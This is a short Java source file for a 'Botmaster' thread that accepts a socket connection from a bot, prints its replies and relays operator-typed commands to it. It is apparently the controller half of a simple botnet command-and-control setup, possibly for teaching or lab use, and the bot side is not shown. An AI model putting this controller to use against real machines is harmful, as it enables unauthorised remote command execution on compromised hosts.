import java.io.*;
import java.net.*;
import java.util.Scanner;

class Botmaster extends Thread {
    Socket sock;
    Botmaster (Socket s) { sock = s;}
    public void run() {
        System.out.println("Thread running:" +currentThread());
        
        
        PrintStream out = null;
        DataInputStream in = null;
        
        try {
            out = new PrintStream (sock.getOutputStream());
            in = new DataInputStream (sock.getInputStream());
			//Send our query
			String query = "Botmaster up and running";
			out.println(query);
		    out.flush();        	    

		while (true) {          
		    //Get the reply
		    String reply = in.readLine();
		    if (reply.equals("break")) {break;}
		    else System.out.println(reply);

			Console console = System.console();
 			String command = console.readLine("Please enter command: \n");
			out.println(command);
			out.flush();	
		   
        }
		 
        sock.close();
        } catch (IOException ioe) { 
			System.out.println("Connection terminated by Bot\n");			
			System.out.println(ioe); 
		}
    }   
}       

